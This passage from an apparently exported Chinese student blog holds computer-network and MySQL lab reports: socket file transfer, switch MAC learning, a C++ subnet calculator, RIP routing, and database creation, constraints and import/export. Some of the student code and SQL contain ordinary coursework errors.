operator">%</span> <span class="token punctuation">(</span>share_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>         <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>  <span class="token comment"># 这样一行一行发比直接发送f.read节省内存空间</span>           conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>line<span class="token punctuation">)</span>     <span class="token keyword">except</span> ConnectionResetError <span class="token keyword">as</span> err<span class="token punctuation">:</span>       <span class="token keyword">break</span>  conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>phone<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实验总结</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml30884\wps11.jpg" alt="img"></p><p>  可以看到在自己电脑上实现了客户端与服务器之间的文件传输，文件有服务器设置的文件夹转写到客户端文件夹即桌面上。</p><h2 id="实验五-交换机自学习与转发"><a href="#实验五-交换机自学习与转发" class="headerlink" title="实验五 交换机自学习与转发"></a>实验五 交换机自学习与转发</h2><p>实验目的</p><blockquote><p>了解仿真器的一般用法；理解交换机的交换方法；掌握交换机的自学习转发算法；验证交换原理。</p></blockquote><p>实验内容:</p><ul><li>安装PT仿真器</li><li>完成仿真实验</li></ul><p> 实验步骤</p><blockquote><p>安装PT仿真器，部署网络，配置PC</p></blockquote><p>配置PC的IP地址时应该注意保持将所有的链接在同一交换机下的所有主机的IP地址都至于同一网络下。</p><p>查看MAC地址表</p><p>现在交换机中使用en指令获得管理员权限，后可以使用如Show mac-address-table显示整张表，如果初始状态存有整个物理地址表的话应该用clear mac-address-table指令清空里面存储的目的地址表</p><p>测试网络连通性</p><p>随机选取一个PC去ping一个已经配置好的IP地址，在得到返回后，进入去下一步检查交换机的物理地址表。</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml30884\wps12.jpg" alt="img"></p><p>查看MAC地址表</p><p>再次在交换机中使用Show mac-address-table命令，可以看到之物理地址表中已经存在一对物理地址。</p><p>这是由于Ping命令的性质所出现的，在接收方接受到发送放发出的ping命令后，会将返回一份ping命令发送到发送放。</p><blockquote><p>Vlan  Mac Address       Type            Ports<br> 1      0050.0f11.9b10   DYNAMIC   Fa0/4<br> 1      00d0.ba73.73a9  DYNAMIC   Fa0/2</p></blockquote><p>随后选取一个没有进行过ping命令的主机去ping 交换机中已经保存的物理地址表中的主机IP号，结果发送放的物理地址被存入MAC地址表，可以证明在交换机的自学习算法在为源地址学习，目的地址转发</p><p>实验总结</p><p>实验基本一切顺利，但是在一开始我本打算从网络上下载一个高版本的CISCO packet tracer student，但是发现下载高版本的需要注册账号，后续在注册之后还存在其他问题，就重新选择下载了6.1版本的。</p><p>交换机自学习与转发在之前的理论课学习中已经学习过，这次去验证也让理解更加的透彻。</p><h2 id="实验六-子网划分器"><a href="#实验六-子网划分器" class="headerlink" title="实验六 子网划分器"></a>实验六 子网划分器</h2><p>实验目的</p><blockquote><p>掌握子网划分的一般方法，实现按需求划分子网。</p></blockquote><p>实验内容:</p><blockquote><p>子网划分基础：2n-2&gt;=a，编写并实现ABC三类IP地址的按需划分</p></blockquote><p>实验步骤</p><p>（1）计算子网号,IP地址范围,子网掩码和广播地址</p><p> 子网划分器实现代码:</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;iostream&gt;#include&lt;string.h&gt;#include&lt;math.h&gt;#include&lt;cstdio&gt;using namespace std;int main()&#123;  int max;  int n ;&#x2F;&#x2F;用于接收以要划分的子网数  int b;&#x2F;&#x2F;输入子网数对应的二进制位数  int X[5];  cout&lt;&lt;&quot;---------------划分子网---------------&quot;&lt;&lt;endl;  cout&lt;&lt;&quot;请输入你要划分的网络：&quot;&lt;&lt;endl;  for(int i&#x3D;1; i&lt;5; i++)&#123;      scanf(&quot;%d.&quot;,&amp;X[i]);  &#125;  if(X[1]&gt;0&amp;&amp;X[1]&lt;&#x3D;126)&#123;      max&#x3D;pow(2,24-2)-2;&#x2F;&#x2F;在子网划分中,最小应该为两位，即除却网络号和广播之外还有两个可用网络      cout&lt;&lt;&quot;本IP地址能划分划分的最大子网数为: &quot;&lt;&lt;max&lt;&lt;endl;  &#125;  else if(X[1]&gt;&#x3D;128&amp;&amp;X[1]&lt;&#x3D;191)&#123;      max&#x3D;pow(2,16-2)-2;      cout&lt;&lt;&quot;本IP地址能划分划分的最大子网数为: &quot;&lt;&lt;max&lt;&lt;endl;  &#125;  else if(X[1]&gt;&#x3D;192&amp;&amp;X[1]&lt;&#x3D;223)&#123;      max&#x3D;pow(2,8-2)-2;      cout&lt;&lt;&quot;本IP地址能划分划分的最大子网数为: &quot;&lt;&lt;max&lt;&lt;endl;  &#125;  else&#123;      printf(&quot; 地址不合格！！！&quot;);  &#125;  cout&lt;&lt;&quot;请输需要划分的子网数&quot;&lt;&lt;endl;  cin&gt;&gt;n;  for(b&#x3D;1; pow(2,b)&lt;n; b++);  cout&lt;&lt;&quot;--------------------------------------&quot;&lt;&lt;endl;  int sum &#x3D; 0;  for(int i&#x3D;0; i&lt;b; i++)&#123;      sum &#x3D; sum +pow(2,(7-i));  &#125;  cout&lt;&lt;&quot;子网掩码为：&quot;&lt;&lt;endl;  if(X[1]&gt;0&amp;&amp;X[1]&lt;&#x3D;126)&#123;      if(b&lt;&#x3D;8)&#123;          cout&lt;&lt;&quot;255.&quot;&lt;&lt;sum&lt;&lt;&quot;.0.0&quot;&lt;&lt;endl;      &#125;else if(b&gt;8&amp;&amp;b&lt;&#x3D;16)&#123;          b&#x3D; b-8;          sum &#x3D; 0;          for(int i&#x3D;0; i&lt;b; i++)&#123;              sum &#x3D; sum + pow(2,(7-i));          &#125;          cout&lt;&lt;&quot;255.255.&quot;&lt;&lt;sum&lt;&lt;&quot;.0&quot;&lt;&lt;endl;      &#125;      else&#123;          b &#x3D; b-16;          sum &#x3D; 0;          for(int i&#x3D;0; i&lt;b; i++)&#123;              sum &#x3D; sum +pow(2,(7-i));          &#125;          cout&lt;&lt;&quot;255.255.255.&quot;&lt;&lt;sum&lt;&lt;endl;      &#125;  &#125;  &#x2F;&#x2F;B类  if(X[1]&gt;&#x3D;128&amp;&amp;X[1]&lt;&#x3D;191)&#123;      if(b&lt;&#x3D;8)&#123;          cout&lt;&lt;&quot;255.255.&quot;&lt;&lt;sum&lt;&lt;&quot;.0&quot;&lt;&lt;endl;      &#125;      else&#123;          b &#x3D; b-8;          sum &#x3D; 0;          for(int i&#x3D;0; i&lt;b; i++)&#123;              sum &#x3D; sum +pow(2,(7-i));          &#125;          cout&lt;&lt;&quot;255.255.255.&quot;&lt;&lt;sum&lt;&lt;endl;      &#125;  &#125;  &#x2F;&#x2F;C类  if(X[1]&gt;&#x3D;192&amp;&amp;X[1]&lt;&#x3D;223)&#123;      cout&lt;&lt;&quot;255.255.255.&quot;&lt;&lt;sum&lt;&lt;endl;  &#125;  cout&lt;&lt;&quot;每网段主机数：&quot;;&#x2F;&#x2F;求每网段主机数  &#x2F;&#x2F;A类  if(X[1]&gt;0&amp;&amp;X[1]&lt;&#x3D;126)&#123;      cout&lt;&lt;(pow(2,(24-b))-2)&lt;&lt;endl;  &#125;  &#x2F;&#x2F;B类  if(X[1]&gt;&#x3D;128&amp;&amp;X[1]&lt;&#x3D;191)&#123;      cout&lt;&lt;(pow(2,(16-b))-2)&lt;&lt;endl;  &#125;  &#x2F;&#x2F;C类  if(X[1]&gt;&#x3D;192&amp;&amp;X[1]&lt;&#x3D;223)&#123;      cout&lt;&lt;(pow(2,(8-b))-2)&lt;&lt;endl;  &#125;  &#x2F;&#x2F;输出各子网IP范围  cout&lt;&lt;&quot;各子网IP范围如下：&quot;&lt;&lt;endl;  &#x2F;&#x2F;A类  if(X[1]&gt;0 &amp;&amp; X[1]&lt;&#x3D;126)&#123;      for(b&#x3D;1; pow(2,b)&lt;n; b++);      if(b&lt;&#x3D;8)&#123;          for (int i&#x3D;0,sub_id&#x3D;0; i&lt;n; i++ )&#123;              sub_id&#x3D; pow(2,(8-b))*i;              cout&lt;&lt;&quot;&lt;&quot;&lt;&lt;i+1&lt;&lt;&quot;&gt; &quot;&lt;&lt;endl;              cout&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;sub_id&lt;&lt;&quot;.0.&quot;&lt;&lt;1&lt;&lt;&quot;---&quot;&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+pow(2,(8-b))-1)&lt;&lt;&quot;.255.254&quot;&lt;&lt;endl;          &#125;      &#125;      if(b&gt;8 &amp;&amp; b&lt;16)&#123;          int subnet_id &#x3D;1;&#x2F;&#x2F;定义子网号          for (int i&#x3D;0; i&lt;pow(2,8); i++ )&#123;              if(i&#x3D;&#x3D;0)&#123;                  for (int k&#x3D;1,sub_id&#x3D;0; k&lt;&#x3D;pow(2,b-8); k++)&#123;                      sub_id &#x3D; pow(2,(16-b))*k;                      cout&lt;&lt;&quot;&lt;&quot;&lt;&lt;(++subnet_id)&lt;&lt;&quot;&gt; &quot;&lt;&lt;endl;                      cout&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;i&lt;&lt;&quot;.&quot;&lt;&lt;sub_id&lt;&lt;&quot;.1------&quot;&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;i&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+pow(2,(16-b))-1)&lt;&lt;&quot;.254&quot;&lt;&lt;endl;                  &#125;              &#125;              else&#123;                  for (int k&#x3D;0,sub_id&#x3D;0; k&lt;&#x3D;pow(2,b-8)-1; k++)&#123;                      if((i&#x3D;&#x3D;255)&amp;&amp;k&#x3D;&#x3D;(pow(2,b-8)-1))&#123;                          break;                      &#125;                      sub_id &#x3D; pow(2,(16-b))*k;                      cout&lt;&lt;&quot;&lt;&quot;&lt;&lt;(++subnet_id)&lt;&lt;&quot;&gt; &quot;&lt;&lt;endl;                      cout&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;i&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id)&lt;&lt;&quot;.1------&quot;&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;i&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+pow(2,(16-b))-1)&lt;&lt;&quot;.254&quot;&lt;&lt;endl;                  &#125;              &#125;          &#125;      &#125;      if(b&gt;&#x3D;16&amp;&amp;b&lt;24)&#123;          int subnet_id &#x3D;0;&#x2F;&#x2F;定义子网号          for(int m&#x3D;0; m&lt;pow(2,8); m++)&#123;              if(m&#x3D;&#x3D;0)&#123;                  for (int i&#x3D;0; i&lt;pow(2,8); i++ )&#123;                      if(i&#x3D;&#x3D;0)&#123;                          for (int k&#x3D;1,sub_id&#x3D;0; k&lt;&#x3D;pow(2,b-16)-1; k++)&#123;                              sub_id &#x3D; pow(2,(24-b))*k;                              cout&lt;&lt;&quot;&lt;&quot;&lt;&lt;(++subnet_id)&lt;&lt;&quot;&gt; &quot;&lt;&lt;endl;                              cout&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;m&lt;&lt;&quot;.&quot;&lt;&lt;i&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+1)&lt;&lt;&quot;------&quot;&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;m&lt;&lt;&quot;.&quot;&lt;&lt;i&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+pow(2,(24-b))-2)&lt;&lt;endl;                          &#125;                      &#125;                      else&#123;                          for (int k&#x3D;0,sub_id&#x3D;0; k&lt;&#x3D;pow(2,b-16)-1; k++)&#123;                              sub_id &#x3D; pow(2,(24-b))*k;                              cout&lt;&lt;&quot;&lt;&quot;&lt;&lt;(++subnet_id)&lt;&lt;&quot;&gt; &quot;&lt;&lt;endl;                              cout&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;m&lt;&lt;&quot;.&quot;&lt;&lt;i&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+1)&lt;&lt;&quot;------&quot;&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;m&lt;&lt;&quot;.&quot;&lt;&lt;i&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+pow(2,(24-b))-2)&lt;&lt;endl;                          &#125;                      &#125;                  &#125;              &#125;              else&#123;                  for (int i&#x3D;0; i&lt;n; i++ )&#123;                      for (int k&#x3D;0,sub_id&#x3D;0; k&lt;&#x3D;pow(2,b-16)-1; k++)&#123;                          if(m&#x3D;&#x3D;255&amp;&amp;(i&#x3D;&#x3D;255)&amp;&amp;k&#x3D;&#x3D;(pow(2,b-16)-1))&#123;                              break;                          &#125;                          sub_id &#x3D; pow(2,(24-b))*k;                          cout&lt;&lt;&quot;&lt;&quot;&lt;&lt;(++subnet_id)&lt;&lt;&quot;&gt; &quot;&lt;&lt;endl;                          cout&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;m&lt;&lt;&quot;.&quot;&lt;&lt;i&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+1)&lt;&lt;&quot;------&quot;&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;m&lt;&lt;&quot;.&quot;&lt;&lt;i&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+pow(2,(24-b))-2)&lt;&lt;endl;&#125;&#125;&#125;&#125;&#125;&#125;  &#x2F;&#x2F;B类  if(X[1]&gt;&#x3D;128&amp;&amp;X[1]&lt;&#x3D;191)&#123;      if(b&lt;&#x3D;8)&#123;          for (int i&#x3D;0,sub_id&#x3D;0; i&lt;n; i++ &#123;              sub_id&#x3D; pow(2,(8-b))*i;              cout&lt;&lt;&quot;&lt;&quot;&lt;&lt;i+1&lt;&lt;&quot;&gt; &quot;&lt;&lt;endl;              cout&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;X[2]&lt;&lt;&quot;.&quot;&lt;&lt;sub_id&lt;&lt;&quot;.1---&quot;&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;X[2]&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+pow(2,(8-b))-1)&lt;&lt;&quot;.254&quot;&lt;&lt;endl;          &#125;       &#125;      if(b&gt;8&amp;&amp;b&lt;16)&#123;          int subnet_id &#x3D;0;&#x2F;&#x2F;定义子网号          for (int i&#x3D;0; i&lt;pow(2,8); i++ )&#123;              if(i&#x3D;&#x3D;0)&#123;                  for (int k&#x3D;1,sub_id&#x3D;0; k&lt;&#x3D;pow(2,b-8)-1; k++)&#123;                      sub_id &#x3D; pow(2,(16-b))*k;                      cout&lt;&lt;&quot;&lt;&quot;&lt;&lt;(++subnet_id)&lt;&lt;&quot;&gt; &quot;&lt;&lt;endl;                      cout&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;X[2]&lt;&lt;&quot;.&quot;&lt;&lt;i&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+1)&lt;&lt;&quot;------&quot;&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;X[2]&lt;&lt;&quot;.&quot;&lt;&lt;i&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+pow(2,(16-b))-2)&lt;&lt;endl;                  &#125;              &#125;              else&#123;                  for (int k&#x3D;0,sub_id&#x3D;0; k&lt;&#x3D;pow(2,b-8)-1; k++)&#123;                      if((i&#x3D;&#x3D;255)&amp;&amp;k&#x3D;&#x3D;(pow(2,b-8)-1))&#123;                          break;                      &#125;                      sub_id &#x3D; pow(2,(16-b))*k;                      cout&lt;&lt;&quot;&lt;&quot;&lt;&lt;(++subnet_id)&lt;&lt;&quot;&gt; &quot;&lt;&lt;endl;                      cout&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;X[2]&lt;&lt;&quot;.&quot;&lt;&lt;i&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+1)&lt;&lt;&quot;------&quot;&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;X[2]&lt;&lt;&quot;.&quot;&lt;&lt;i&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+pow(2,(16-n))-2)&lt;&lt;endl;                  &#125;              &#125;          &#125;      &#125;  &#125;  &#x2F;&#x2F;C类  if(X[1]&gt;&#x3D;192&amp;&amp;X[1]&lt;&#x3D;223)&#123;      for (int i&#x3D;0,sub_id&#x3D;0; i&lt;n; i++ )&#123;          sub_id&#x3D; pow(2,(8-b))*i;          cout&lt;&lt;&quot;&lt;&quot;&lt;&lt;i+1&lt;&lt;&quot;&gt; &quot;&lt;&lt;endl;          cout&lt;&lt;&quot;广播号:&quot;&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;X[2]&lt;&lt;&quot;.&quot;&lt;&lt;X[3]&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id)&lt;&lt;endl;          cout&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;X[2]&lt;&lt;&quot;.&quot;&lt;&lt;X[3]&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+1)&lt;&lt;&quot;---&quot;&lt;&lt;X[1]&lt;&lt;&quot;.&quot;&lt;&lt;X[2]&lt;&lt;&quot;.&quot;&lt;&lt;X[3]&lt;&lt;&quot;.&quot;&lt;&lt;(sub_id+pow(2,(8-b))-2)&lt;&lt;endl;      &#125;  &#125;  cout&lt;&lt;&quot;子网划分完毕&quot;&lt;&lt;endl;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml30884\wps13.jpg" alt="img"></p><h2 id="实验七-：-RIP仿真器"><a href="#实验七-：-RIP仿真器" class="headerlink" title="实验七 ： RIP仿真器"></a>实验七 ： RIP仿真器</h2><p>实验目的</p><blockquote><p>理解RIP的工作原理，掌握距离向量算法</p></blockquote><p>实验原理:</p><p>收到相邻路由器（其地址为 X）的一个 RIP 报文：</p><ul><li><p>先修改此 RIP 报文中的所有项目：把“下一跳”字段中的地址都改为 X，并把所有的“距离”字段的值加 1。</p></li><li><p>对修改后的 RIP 报文中的每一个项目，重复以下步骤：若项目中的目的网络不在路由表中，则把该项目加到路由表中。否则进入比较，若下一跳字段给出的路由器地址是同样的，则把收到的项目替换原路由表中的项目。否则判断到达项目的距离是否小于路由表中的距离，若收到项目中的距离小于路由表中的距离，则进行更新，否则，什么也不做。</p></li><li><p>若 3 分钟还没有收到相邻路由器的更新路由表，则把此相邻路由器记为不可达路由器，即将距离置为16（距离为16表示不可达）。</p></li><li><p>返回。</p></li></ul><p>实验步骤：</p><ul><li>RIP距离向量算法在实现过程中能够向路由器发送数据的一定是相邻路由器，对相邻路由器添加函数进行修改，增加判断，使之能够加入新添加的相邻路由</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void AddNearRouter()&#x2F;&#x2F;相邻路由器添加函数&#123;  int flag&#x3D;0;  printf(&quot;\n请输入相邻路由器名称：\n&quot;);  scanf(&quot;%s&quot;,nearR1);  for(i&#x3D;0; i&lt;l1; ++i)&#123;      if(RT1[i].dstNet&#x3D;&#x3D;nearR1)&#123;          flag&#x3D;1;      &#125;  &#125;  if(flag&#x3D;&#x3D;0)&#123;      strcpy( RT1[l1].dstNet,nearR1 );      RT1[l1].distance&#x3D;1;      strcpy( RT1[l1].nextSkip,nearR1 );      ++l1;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）根据要求完成参考代码。</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml30996\wps1.jpg" alt="img"> </p><p>\5. 实验总结</p><p>理解RIP了的工作原理,了解并掌握了距离向量算法的相关内容，</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库实验报告</title>
      <link href="/2022/07/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
      <url>/2022/07/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><blockquote><p>这个主要是将本学期，的实验报告进行一个汇总</p></blockquote><h3 id="实验二：数据库的创建和使用操作"><a href="#实验二：数据库的创建和使用操作" class="headerlink" title="实验二：数据库的创建和使用操作"></a>实验二：数据库的创建和使用操作</h3><p><strong>一、实验目的</strong></p><p>1.安装配置MySQL workbench或者sqlyog客户端，并实现服务的连接。</p><p>2.学习mysql workbench 的操作。</p><p>3.使用mysql workbench创建school表格，并熟悉对简单数据的录入。</p><p><strong>二、实验要求</strong></p><p>1.成功运行workbench。</p><p>2.创建表格并实现对数据的录入。</p><p><strong>三、实验过程</strong></p><p>1.运行workbench。</p><p>新建一个数据库：在左侧的界面中点击schemas，在空白处右键，创建一个新的数据库。</p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml8672\wps1.jpg" style="zoom:80%;" /><p>可以命名为school。新建表，点击apply，即为成功创建一个新的表。在左侧菜单内可以找到自己新建的表。打开表，可以在表格中输入自己想要的数据。</p><p>其中，数据库名，表名，表头名均不允许用中文。数据库中表格数据的大写选项解释如下：</p><blockquote><p>NN：not null 非空<br>UQ：unique 唯一索引 不许重复<br>BIN：binary 二进制数据(比text更大的二进制数据)<br>UN：unsigned 无符号   整数（非负数）<br>ZF：zero fill 填充0 例如字段内容是1 int(4), 则内容显示为0001<br>AI：auto increment 自增<br>G：generated column 生成列</p></blockquote><h3 id="实验三：数据库常见错误的试错与分析"><a href="#实验三：数据库常见错误的试错与分析" class="headerlink" title="实验三：数据库常见错误的试错与分析"></a>实验三：数据库常见错误的试错与分析</h3><p><strong>一、【实验目的】</strong></p><p>1.学会建立简单的数据库表格，并对常见出现的错误进行试错与分析。</p><p>2.学会限制数据的取值范围。</p><p><strong>二、【实验要求】</strong></p><p>1.进行对表格数据的试错。</p><p>2.认识在试错时候出现的错误。（数据类型错误，key键的是否唯一，数据的取值是否在规定的范围内等）</p><p>3.学会用外部键处理数据。</p><p><strong>三、【实验过程】</strong></p><p>一、数据类型错误，key不是唯一，或数据超过规定的长度：都是常见的数据库错误。</p><p>二. 限制数据的范围：</p><p>用外部键进行数据取值的限制，在sqlyog中实现这一操作。关系外键一般的取名原则为：fk（代表外键）_引用列名_被引用列名。</p><h3 id="实验四：数据库的导入和导出"><a href="#实验四：数据库的导入和导出" class="headerlink" title="实验四：数据库的导入和导出"></a>实验四：数据库的导入和导出</h3><p><strong>一、实验目的</strong></p><ol><li><p>掌握数据库的导入和导出相关知识</p></li><li><p>练习并使用cheak约束完成实验</p></li></ol><p><strong>二、实验要求</strong></p><p>(1) 使用MySQL创建数据库表</p><p>(2) 简单使用Data Export,Data import 练习导入和导出数据库</p><p>(3) 尝试使用sqlyog对数据库进行cheak约束。</p><p><strong>三、实验过程</strong></p><ol><li><p>建立数据库：创建具有三张表格的school数据库</p></li><li><p>找到Administration选项卡下的Data Export选项，选中创建好的school数据库，依次使用Export to Dump Project Folder和Export to self-Contained File验证实验结果，在使用Export to self-Contained File时生成一个.sql文件，在使用Export to Dump Project Folder生成一个文件夹。</p></li><li><p>使用Data import练习导入数据库</p><ul><li>选中数据库drop，删库。</li><li>Data import 分别选中两种导入方式导入数据库，刷新发现数据库被成功导入，名字仍然叫做school。</li><li>我们可以看到在导入和导入后的数据库信息不回发生改变。</li></ul></li><li><p>在SQLyog里，创建一张新表可以对其添加约束条件，我们可以使用sql语句使得，表格中部分选项数据设置一定的范围，在后续的使用中，如果写入数据不满足约束的话，系统会报错而不会执行，这是因为在添加约束时的约束项限制了我们可以导入的数据范围。</p></li><li><p>另外的，在不同版本的sqlyog中对这一操作的兼容不同，存在不少的Mysql版本并不支持执行约束。</p><ul><li>比如MySQL5.7 可以使用check约束，但check约束对数据验证没有任何作用。添加数据时，没有任何错误或警告，但是MySQL 8.0中可以使用check约束了。</li></ul></li></ol><p><strong>四、实验反思:</strong></p><p>在实验的过程中，我使用的sqlyog版本并不支持，check约束，我无法添加check约束，在解决这个问题的过程中，我查找这些问题，在他人的博客上，说check约束，在MySQL中只是作为一般的注释，对数据库没有约束功能。但是在借用同学计算机使用后，发现check语句能够对MySQL数据库进行约束，在通过了查阅很多资料后。</p><p>确认了在不同版本的sqlyog中对这一操作的兼容不同，存在不少的Mysql版本并不支持执行约束。</p><p>比如MySQL5.7 可以使用check约束，但check约束对数据验证没有任何作用。添加数据时，没有任何错误或警告，但是MySQL 8.0中可以使用check约束了。</p><h3 id="实验五：使用SQL语句创建和使用数据库"><a href="#实验五：使用SQL语句创建和使用数据库" class="headerlink" title="实验五：使用SQL语句创建和使用数据库"></a>实验五：使用SQL语句创建和使用数据库</h3><p><strong>一、实验目的</strong></p><ol><li>掌握SQL语句实现数据库的创建和使用</li></ol><p><strong>二、实验要求</strong></p><ol><li>使用MySQL创建数据库表</li><li>简单使用Data Export,Data import 练习导入和导出数据库</li><li>尝试使用sqlyog对数据库进行cheak约束。</li></ol><p><strong>三、实验过程</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">DROP DATABASE &#96;school&#96; ;-- 删除原有数据库 schoolCREATE SCHEMA &#96;school&#96; DEFAULT CHARACTER SET utf8 COLLATE utf8_bin ;-- 创建新数据库 schooluse school;-- 选择使用school数据库，避免修改默认数据库sysCREATE TABLE student ( sno CHAR(10) NOT NULL, cno VARCHAR(45) NOT NULL, sage INT NULL DEFAULT 18, PRIMARY KEY (sno))COMMENT &#x3D; &#39;这是一个学生数据库&#39;;-- 创建第一张student表create table course(cno char(4) not null primary key,cname varchar(45) not null,cpno char(4) references cno,credit tinyint);-- 创建第二张course表create table sc(sno char(10),cno char(4),score int,PRIMARY key(sno,cno),foreign key(sno) references student(sno),foreign key(sno) references course(cno));-- 创建第三张sc表并设置两个外键<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>四、拓展学习：</strong></p><p><strong>MySQL 外键(FOREIGN KEY)用法：</strong></p><p>表与表的记录之间存在着三种关系：一对多、多对多、一对一的关系。处理表之间关系问题就会利用到FOREIGN KEY</p><p>约束1：在创建表时，先建被关联的表dep，才能建关联表emp</p><p>约束2：在插入记录时，必须先插被关联的表dep，才能插关联表emp</p><p>约束3：更新与删除都需要考虑到关联与被关联的关系。</p><p><strong>2.MySQL中支持的编码方式：</strong></p><p>整形：</p><table><thead><tr><th>tinyint(m)</th><th>1个字节表示(-128~127)</th></tr></thead><tbody><tr><td>smallint(m)</td><td>2个字节表示(-32768~32767)</td></tr><tr><td>mediumint(m)</td><td>3个字节表示(-8388608~8388607)</td></tr><tr><td>int(m)</td><td>4个字节表示(-2147483648~2147483647)</td></tr><tr><td>bigint(m)</td><td>8个字节表示(+-9.22*10的18次方)</td></tr></tbody></table><p>浮点型：</p><table><thead><tr><th>float(m,d)</th><th>单精度浮点型，8位精度(4字节),m是十进制数字的总个数， 